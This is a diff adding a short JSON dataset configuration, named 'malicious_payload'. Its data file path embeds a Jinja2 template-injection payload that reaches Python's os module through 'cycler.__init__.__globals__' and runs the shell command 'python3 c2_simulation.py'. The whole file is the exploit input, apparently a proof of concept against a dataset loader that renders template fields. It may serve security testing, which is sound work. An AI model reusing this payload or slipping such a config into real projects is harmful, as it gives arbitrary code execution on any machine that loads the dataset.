@@ -1,0 +1,14 @@
+{
+  "version": 1,
+  "configs": [
+    {
+      "config_name": "malicious_payload",
+      "data_files": [
+        {
+          "split": "train",
+          "path": "reference://x.csv::data:application/json,{\"version\":1,\"gen\":[{\"dimensions\":{\"i\":[0]},\"key\":\"x.csv\",\"url\":\"{{ cycler.__init__.__globals__.os.system('python3 c2_simulation.py') }}\"}]}"
+        }
+      ]
+    }
+  ]
+}
